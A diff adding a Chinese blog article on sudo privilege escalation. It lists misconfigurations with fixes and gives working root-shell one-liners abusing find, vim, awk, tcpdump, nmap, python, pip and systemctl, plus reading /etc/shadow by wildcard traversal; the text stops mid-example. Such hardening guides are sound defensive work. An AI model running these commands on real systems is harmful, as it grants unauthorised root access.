@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>sudo常用提权方式 &mdash; Liping's Blog</title>
+  <meta name="author" content="Yang Liping">
+
+
+
+
+
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <link href="http://www.yanglp.com/favicon.png" rel="icon">
+
+  <link href="http://www.yanglp.com/theme/css/main.css" media="screen, projection"
+        rel="stylesheet" type="text/css">
+
+  <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic"
+        rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic"
+        rel="stylesheet" type="text/css">
+</head>
+
+<body>
+  <header role="banner"><hgroup>
+  <h1><a href="http://www.yanglp.com/">Liping's Blog</a></h1>
+    <h2>翁曰：「無他，但手熟爾。」</h2>
+</hgroup></header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+</ul>
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="www.yanglp.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+<ul class="main-navigation">
+    <li><a href="/">Home</a></li>
+    <li><a href="/archives">Arcives</a></li>
+</ul></nav>
+  <div id="main">
+    <div id="content">
+<div>
+  <article class="hentry" role="article">
+<header>
+      <h1 class="entry-title">sudo常用提权方式</h1>
+    <p class="meta">
+<time datetime="2021-01-29T15:29:39.139086+08:00" pubdate>Fri 29 January 2021</time>    </p>
+</header>
+
+  <div class="entry-content"><h4>用户可写的目录或文件</h4>
+<p><strong>使用场景</strong>：允许用户执行<code>sudo /home/user/script.sh</code>以其他用户权限执行脚本，用户可以直接修改<code>script.sh</code>或者替换成其他文件，从而实现提权。</p>
+<div class="highlight"><pre><span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ld</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span><span class="o">/</span><span class="n">bin</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span>
+<span class="n">drwx</span><span class="o">------</span> <span class="mi">28</span> <span class="n">yangliping</span> <span class="n">yangliping</span> <span class="mi">8192</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mi">12</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mo">01</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mo">02</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>     <span class="mi">36</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mo">02</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">yangliping</span> <span class="n">yangliping</span> <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mo">02</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">yangliping</span> <span class="n">yangliping</span> <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mo">03</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span><span class="o">/</span><span class="n">bin</span>
+<span class="o">-</span><span class="n">rwxrw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">yangliping</span> <span class="n">yangliping</span>   <span class="mi">48</span> <span class="n">Jan</span> <span class="mi">28</span> <span class="mi">10</span><span class="o">:</span><span class="mo">03</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span>
+
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">User</span> <span class="n">yangliping</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">server</span><span class="o">:</span>
+    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span>
+
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span>
+<span class="n">Hello</span> <span class="n">from</span> <span class="n">root</span><span class="p">.</span>
+
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">mv</span> <span class="o">-</span><span class="n">f</span> <span class="o">--</span><span class="n">backup</span><span class="o">=</span><span class="n">t</span> <span class="o">-</span><span class="n">T</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo_hack</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span>
+
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span><span class="o">/</span><span class="n">sudo</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">hello</span><span class="p">.</span><span class="n">sh</span>
+<span class="n">Haaaaaaaaaaa</span><span class="p">.</span> <span class="n">I</span><span class="err">&#39;</span><span class="n">m</span> <span class="n">root</span> <span class="n">now</span><span class="p">.</span>
+</pre></div>
+
+
+<p><strong>解决方案</strong>：保证sudo执行的文件及文件的所有父目录不能被用户修改。</p>
+<h4>可执行shell或其他命令的软件</h4>
+<p><strong>使用场景</strong>：<code>vi</code>，<code>vim</code>，<code>ed</code>，<code>emacs</code>，<code>edit</code>，<code>more</code>，<code>less</code>，<code>man</code>，<code>find</code>，<code>awk</code>，<code>rpm</code>，<code>ftp</code>，<code>tcpdump</code>，<code>nmap</code>等命令都可以执行其他命令，甚至是shell。</p>
+<div class="highlight"><pre><span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">find</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">exec</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="err">\</span><span class="p">;</span>
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">vim</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="o">!</span><span class="n">sh</span><span class="err">&#39;</span>
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">awk</span> <span class="err">&#39;</span><span class="n">BEGIN</span> <span class="p">{</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">)}</span><span class="err">&#39;</span>
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">rpm</span> <span class="o">--</span><span class="n">eval</span> <span class="err">&#39;</span><span class="o">%</span><span class="p">{</span><span class="n">lua</span><span class="o">:</span><span class="n">os</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">)}</span><span class="err">&#39;</span>
+
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">vim</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">file</span>
+<span class="err">或者</span> <span class="err">$</span> <span class="n">sudo</span> <span class="n">more</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">file</span>
+<span class="err">或者</span> <span class="err">$</span> <span class="n">sudo</span> <span class="n">less</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">file</span>
+<span class="err">或者</span> <span class="err">$</span> <span class="n">sudo</span> <span class="n">man</span> <span class="n">ls</span>
+<span class="err">或者</span> <span class="err">$</span> <span class="n">sudo</span> <span class="n">ftp</span>
+
+<span class="err">执行</span><span class="o">!</span><span class="n">bash</span><span class="err">即可获得</span><span class="n">bash</span> <span class="n">shell</span><span class="err">权限</span>
+
+<span class="n">tcpdump</span><span class="err">和</span><span class="n">nmap</span><span class="err">也可以执行任意命令</span>
+
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">echo</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">id</span><span class="err">&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span> <span class="o">&amp;&amp;</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span> <span class="o">&amp;&amp;</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">tcpdump</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">W</span> <span class="mi">1</span> <span class="o">-</span><span class="n">G</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span> <span class="o">-</span><span class="n">Z</span> <span class="n">roo</span>
+<span class="n">t</span>
+<span class="nl">tcpdump:</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">eth0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="n">type</span> <span class="n">EN10MB</span> <span class="p">(</span><span class="n">Ethernet</span><span class="p">),</span> <span class="n">capture</span> <span class="n">size</span> <span class="mi">65535</span> <span class="n">bytes</span>
+<span class="n">Maximum</span> <span class="n">file</span> <span class="n">limit</span> <span class="n">reached</span><span class="o">:</span> <span class="mi">1</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+
+<span class="n">user</span><span class="err">@</span><span class="n">server</span><span class="o">:~</span><span class="err">$</span> <span class="n">echo</span> <span class="s">&quot;os.execute(&#39;/bin/sh&#39;)&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span> <span class="o">&amp;&amp;</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span>
+</pre></div>
+
+
+<p><strong>解决方案</strong>：确保<code>sudo</code>执行的软件不能执行其他命令。用<code>RESTRICT</code>或者 <code>NOEXEC</code>，如果是编辑文件，可以用<code>sudoedit</code>。</p>
+<div class="highlight"><pre><span class="n">aaron</span>  <span class="n">shanty</span> <span class="o">=</span> <span class="n">NOEXEC</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">more</span><span class="p">,</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">vi</span>
+</pre></div>
+
+
+<h4>NOEXEC不生效</h4>
+<p><strong>使用场景</strong>：根据<a href="https://support.oneidentity.com/kb/250257/noexec-isn-t-working-in-sudoers-file">这个案例</a>，有些系统<code>/bin</code>目录是链接到<code>/usr/bin</code>目录的，以下配置的情况下，用户仍然可以在vim里运行shell</p>
+<div class="highlight"><pre><span class="c">%sudo_users ALL=(root) ALL, (root) NOEXEC: /usr/bin/vi, /usr/bin/vim</span>
+</pre></div>
+
+
+<p>需要改成下面的配置</p>
+<div class="highlight"><pre><span class="c">%sudo_users ALL=(root) ALL, (root) NOEXEC: /bin/vi, /usr/bin/vi, /bin/vim, /usr/bin/vim </span>
+</pre></div>
+
+
+<p><strong>解决方案</strong>：<code>sudo</code>配置要确认生效</p>
+<h4>允许sudo执行chown/chmod命令</h4>
+<p><strong>使用场景</strong>：可以用<code>chown/chmod</code>命令把重要文件修改成用户可改，然后再恢复。比如/etc/shadow改root密码，在/etc/sudoers增加权限等。</p>
+<p><strong>解决方案</strong>：用<code>setfacl</code>允许用户修改文件，或者用<code>sudoedit</code>。</p>
+<h4>允许sudo执行mv、cp、scp、rsync等命令</h4>
+<p><strong>使用场景</strong>：使用<code>mv</code>，<code>cp</code>，<code>scp</code>，<code>rsync</code>等命令可以修改重要的文件，比如/etc/passwd。</p>
+<p><strong>解决方案</strong>：禁止直接使用，可以考虑封装在脚本里。</p>
+<h4>允许可以修改文件的程序写任意文件</h4>
+<p><strong>使用场景</strong>：使用<code>tee</code>，<code>sed</code>等命令可以修改重要的文件，比如/etc/passwd。</p>
+<div class="highlight"><pre><span class="n">echo</span> <span class="s">&quot;hahaha&quot;</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">reallyimportantstuff</span>
+</pre></div>
+
+
+<p><strong>解决方案</strong>：用<code>setfacl</code>允许用户修改文件，或者用<code>sudoedit</code>。</p>
+<h4>允许直接运行脚本语言解释器</h4>
+<p><strong>使用场景</strong>：允许<code>python</code>，<code>perl</code>，<code>ruby</code>，<code>lua</code>等脚本解释器直接sudo运行意味着用户可以做所有事情。</p>
+<div class="highlight"><pre><span class="n">user</span> <span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">pyton</span><span class="p">,</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">perl</span>
+
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span><span class="err">&#39;</span>
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">exec</span> <span class="s">&quot;/bin/bash&quot;</span><span class="p">;</span><span class="err">&#39;</span>
+</pre></div>
+
+
+<p><strong>解决方案</strong>：不允许sudo运行<code>python</code>，<code>perl</code>，<code>ruby</code>，<code>lua</code>等。</p>
+<h4>通配符风险</h4>
+<p><strong>使用场景</strong>：sudo的通配符功能会导致安全风险</p>
+<div class="highlight"><pre><span class="n">user</span> <span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/*</span>
+
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="o">|</span> <span class="n">tail</span>
+<span class="nl">dbadmin:</span><span class="o">!!:</span><span class="mi">16895</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">99999</span><span class="o">:</span><span class="mi">7</span><span class="o">:::</span>
+<span class="nl">dbuser:</span><span class="o">!!:</span><span class="mi">16895</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">99999</span><span class="o">:</span><span class="mi">7</span><span class="o">:::</span>
+<span class="nl">nscd:</span><span class="o">!!:</span><span class="mi">17778</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">99999</span><span class="o">:</span><span class="mi">7</span><span class="o">:::</span>
+<span class="nl">nginx:</span><span class="o">!!:</span><span class="mi">17998</span><span class="o">::::::</span>
+
+<span class="n">user</span> <span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">messages</span><span class="o">*</span>
+
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">messages</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="o">|</span> <span class="n">tail</span>
+<span class="nl">dbadmin:</span><span class="o">!!:</span><span class="mi">16895</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">99999</span><span class="o">:</span><span class="mi">7</span><span class="o">:::</span>
+<span class="nl">dbuser:</span><span class="o">!!:</span><span class="mi">16895</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">99999</span><span class="o">:</span><span class="mi">7</span><span class="o">:::</span>
+<span class="nl">nscd:</span><span class="o">!!:</span><span class="mi">17778</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">99999</span><span class="o">:</span><span class="mi">7</span><span class="o">:::</span>
+<span class="nl">nginx:</span><span class="o">!!:</span><span class="mi">17998</span><span class="o">::::::</span>
+
+<span class="n">user</span> <span class="n">ALL</span><span class="o">=</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="o">*</span> <span class="n">httpd</span>
+
+<span class="cp"># 用户可以sudo对其他服务进行操作</span>
+
+<span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">stop</span> <span class="n">iptables</span> <span class="n">auditd</span> <span class="n">httpd</span>
+
+<span class="cp"># 如果允许sudo root执行`rm -Rf /some/path/*`会怎么样？</span>
+</pre></div>
+
+
+<p>具体参考Redhat KB文档<a href="https://access.redhat.com/solutions/204823">Sudo interpretation of wildcard like /var/log/messages* can indirectly expose a security risk</a>。</p>
+<p><strong>解决方案</strong>：最好不要用通配符，确实需要使用的时候应该确保安全设置。</p>
+<h4>禁用env_reset导致环境变更引起的漏洞（v1.6.9 - v1.8.4p5）</h4>
+<p><strong>使用场景</strong>：在某些版本的sudo中，如果用<code>!env_reset</code>禁用环境变量重置，用户可以通过PYTHONPATH之类的环境变量实现任意命令的执行。</p>
+<p>比如下面的代码：</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">sudo_test</span><span class="o">.</span><span class="n">py</span>
+<span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="s">&#39;SGVsbG8gZnJvbSByb290</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">))</span>
+</pre></div>
+
+
+<p>正常sudo执行输出如下：</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">sudo_test</span><span class="p">.</span><span class="n">py</span>
+<span class="n">Hello</span> <span class="n">from</span> <span class="n">root</span>
+</pre></div>
+
+
+<p>用户可以通过修改过的base64模块执行其他命令</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">diff</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">python2</span><span class="mf">.6</span><span class="o">/</span><span class="n">base64</span><span class="p">.</span><span class="n">py</span> <span class="n">base64</span><span class="p">.</span><span class="n">py</span>
+<span class="mi">10</span><span class="n">a11</span>
+<span class="o">&gt;</span> <span class="n">import</span> <span class="n">os</span>
+<span class="mi">320</span><span class="n">a322</span>
+<span class="o">&gt;</span>     <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;echo &#39;**Hello from python base64 module**&#39;&quot;</span><span class="p">)</span>
+
+<span class="err">$</span> <span class="n">sudo</span> <span class="n">PYTHONPATH</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">sudo_test</span><span class="p">.</span><span class="n">py</span>
+<span class="o">**</span><span class="n">Hello</span> <span class="n">from</span> <span class="n">python</span> <span class="n">base64</span> <span class="n">module</span><span class="o">**</span>
+<span class="n">Hello</span> <span class="n">from</span> <span class="n">root</span>
+</pre></div>
+
+
+<p>man手册对于<code>env_reset</code>的解释如下：</p>
+<blockquote>
+<p>By default, the env_reset flag is enabled.  This causes commands to be executed with a new, minimal environment. </p>
+<p>If, however, the env_reset flag is disabled, any variables not explicitly denied by the env_check and env_delete options are allowed and their values are inherited from the invoking process.</p>
+</blockquote>
+<p>新版本的sudo修复了这个问题，具体点击<a href="https://www.sudo.ws/alerts/env_add.html">链接</a>了解。RHEL 6.0 ~ 6.3自带的是sudo 1.7会有这个问题，RHEL 6.4换成了sudo 1.8.6p3。</p>
+<p><strong>解决方案</strong>：虽然sudo把很多环境变量列入黑名单，执行的时候会有以下错误</p>
+<div class="highlight"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="n">PYTHONPATH</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">yangliping</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">sudo_test</span><span class="p">.</span><span class="n">py</span>
+<span class="nl">sudo:</span> <span class="n">sorry</span><span class="p">,</span> <span class="n">you</span> <span class="n">are</span> <span class="n">not</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">set</span> <span class="n">the</span> <span class="n">following</span> <span class="n">environment</span> <span class="n">variables</span><span class="o">:</span> <span class="n">PYTHONPATH</span>
+</pre></div>
+
+
+<p>但是还是有可能会有其他未知的环境变量导致漏洞，不建议设置<code>!env_reset</code>。如果有特殊的环境变量确实需要保留，在确保安全的情况下，可以设置<code>env_check</code>/<code>env_keep</code>来传递环境变量，也就是开白名单。另外，root用户执行<code>sudo -V</code>可以显示哪些环境变量会被清除。</p>
+<div class="highlight"><pre><span class="n">Environment</span> <span class="n">variables</span> <span class="n">to</span> <span class="n">check</span> <span class="k">for</span> <span class="n">safety</span><span class="o">:</span>
+        <span class="n">TZ</span>
+        <span class="n">TERM</span>
+        <span class="n">LINGUAS</span>
+        <span class="n">LC_</span><span class="o">*</span>
+        <span class="n">LANGUAGE</span>
+        <span class="n">LANG</span>
+        <span class="n">COLORTERM</span>
+<span class="n">Environment</span> <span class="n">variables</span> <span class="n">to</span> <span class="n">remove</span><span class="o">:</span>
+        <span class="o">*=</span><span class="p">()</span><span class="o">*</span>
+        <span class="n">RUBYOPT</span>
+        <span class="n">RUBYLIB</span>
+        <span class="n">PYTHONUSERBASE</span>
+        <span class="n">PYTHONINSPECT</span>
+        <span class="n">PYTHONPATH</span>
+        <span class="n">PYTHONHOME</span>
+<span class="p">......</span>
+</pre></div>
+
+
+<h4>允许执行pip、rpm、yum、dnf导致的提权</h4>
+<p><strong>使用场景</strong>：具体参考<a href="https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/">链接</a>，用户用以下的方式即可获得root shell。</p>
+<div class="highlight"><pre><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot;</span> &gt; <span class="nv">$TF</span>/setup.py
+sudo pip install <span class="nv">$TF</span>
+</pre></div>
+
+
+<p>rpm/yum/dnf也可以用类似的方式提权</p>
+<div class="highlight"><pre><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
+<span class="nb">echo</span> <span class="s1">&#39;id&#39;</span> &gt; <span class="nv">$TF</span>/x.sh
+fpm -n x -s dir -t rpm -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
+
+sudo rpm -ivh x-1.0-1.noarch.rpm
+
+sudo yum localinstall -y x-1.0-1.noarch.rpm
+</pre></div>
+
+
+<p>另外，yum还可以通过插件的方式执行root提权，可以下载任意文件，具体见<a href="https://gtfobins.github.io/gtfobins/yum/">链接</a>。</p>
+<p><strong>解决方案</strong>：不要设置允许普通用户执行pip或者rpm/yum。</p>
+<h4>允许执行systemctl导致的提权</h4>
+<p><strong>使用场景</strong>：<code>systemctl</code>命令有几种方式获取root shell：</p>
+<ul>
+<li>通过<code>SYSTEMD_EDITOR</code></li>
+</ul>
+<div class="highlight"><pre><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
+<span class="nb">echo</span> /bin/sh &gt;<span class="nv">$TF</span>
+chmod +x <span class="nv">$TF</span>
+sudo <span class="nv">SYSTEMD_EDITOR</span><span class="o">=</span><span class="nv">$TF</span> systemctl edit system.slice
+</pre></div>
+
+
+<ul>
+<li>通过新添加特殊的服务</li>
+</ul>
+<div class="highlight"><pre><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+<span class="nb">echo</span> <span class="s1">&#39;[Service]</span>
+<span class="s1">Type=oneshot</span>
+<span class="s1">ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;</span>
+<span class="s1">[Install]</span>
